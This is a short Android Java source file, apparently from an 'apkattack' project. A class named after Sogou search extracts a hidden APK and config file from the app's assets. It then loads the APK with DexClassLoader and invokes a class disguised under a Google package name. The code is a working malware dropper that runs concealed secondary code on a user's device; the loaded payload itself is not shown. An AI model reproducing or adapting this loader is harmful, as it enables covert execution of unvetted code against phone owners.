package com.example.apkattack;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class SogouSearch {
	
    public static void sogousearchEntry(Context context){
    	String Tag = "sogousearchEntry";
    	try {
	    	//String apppath = "/data/data/com.tencent.FileManager/files/";
	    	//String appcachepath = "/data/data/com.tencent.FileManager/cache/";
	    	String apppath = context.getFilesDir() + "/";
	    	String appcachepath = context.getCacheDir() + "/";
	    	String apkfn = "qqsdl.apk";
	    	String cfgfn = "ark.dat";
	    	String dexclassname = "com.google.android.apps.plus.JarEntry";
	    	String dexmethodname = "start";
	    	
	    	File fileapk = new File(apppath + apkfn);
	    	File filecfg = new File(apppath + cfgfn);
	    	if (fileapk.exists() == false || filecfg.exists() == false) {
	            InputStream is = context.getAssets().open(apkfn);
	            int size = is.available();
	            byte[] buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            FileOutputStream os = new FileOutputStream(apppath + apkfn);
	            os.write(buffer);
	            os.close();
	            
	            is = context.getAssets().open(cfgfn);
	            size = is.available();
	            buffer = new byte[size];
	            is.read(buffer);
	            is.close();
	            os = new FileOutputStream(apppath + cfgfn);
	            os.write(buffer);
	            os.close();
			}

    	
	    	DexClassLoader dexcl = new DexClassLoader(apppath + apkfn, appcachepath, null,context.getClassLoader());
    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "apk load success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "apk load exception");
    	}
    }
	
	
	
}
